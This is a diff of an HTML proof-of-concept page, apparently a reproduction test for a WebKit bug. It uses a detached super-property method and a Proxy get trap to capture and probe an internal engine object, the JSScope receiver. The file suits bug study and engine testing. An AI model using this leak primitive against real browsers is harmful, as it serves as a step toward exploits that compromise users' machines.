@@ -1,51 +1,51 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <meta charset="utf-8">
-  <title>WebKit JSScope Leak Test</title>
-  <style>
-    body { font-family: monospace; background: #111; color: #0f0; padding: 10px; }
-  </style>
-</head>
 <body>
-  <div id="log"></div>
-  <script>
-    function log(msg) {
-      const el = document.createElement("div");
-      el.textContent = msg;
-      document.getElementById("log").appendChild(el);
+<pre id="out"></pre>
+<script>
+function log(msg) {
+    document.getElementById('out').textContent += msg + '\n';
+}
+
+function leakReceiverViaSuperGet() {
+    class Leaker {
+        leak() {
+            return super.secret;
+        }
     }
 
-    class Leaker {
-      leak() {
-        return super.secret;
-      }
-    }
+    let leakedReceiver = null;
 
     Leaker.prototype.__proto__ = new Proxy({}, {
-      get(target, prop, receiver) {
-        log("[+] Proxy trap triggered");
-        log("    typeof receiver: " + typeof receiver);
+        get(target, propertyName, receiver) {
+            leakedReceiver = receiver;
+            log("typeof receiver: " + typeof leakedReceiver);
+            try {
+                log("receiver.constructor: " + leakedReceiver.constructor);
+            } catch (e) {
+                log("receiver.constructor threw: " + e.message);
+            }
+            log("receiver instanceof Object: " + (leakedReceiver instanceof Object));
+            log("Object.getPrototypeOf(receiver): " + Object.getPrototypeOf(leakedReceiver));
+            log("Object.isExtensible(receiver): " + Object.isExtensible(leakedReceiver));
+            try {
+                log("Own property names: " + Object.getOwnPropertyNames(leakedReceiver).join(', '));
+            } catch (e) {
+                log("Object.getOwnPropertyNames threw: " + e.message);
+            }
 
-        try {
-          log("    receiver.constructor: " + receiver.constructor);
-        } catch (e) {
-          log("    receiver.constructor threw: " + e.message);
+            for (let key in leakedReceiver) {
+                log("receiver[" + key + "] = " + leakedReceiver[key]);
+            }
+
+            return 42;
         }
-
-        try {
-          log("    receiver instanceof Object: " + (receiver instanceof Object));
-        } catch (e) {
-          log("    instanceof check threw: " + e.message);
-        }
-
-        return 1337;
-      }
     });
 
-    const secret = 42;
     const { leak } = Leaker.prototype;
-    leak();
-  </script>
+    leak(); // trigger leak
+}
+leakReceiverViaSuperGet();
+</script>
 </body>
 </html>
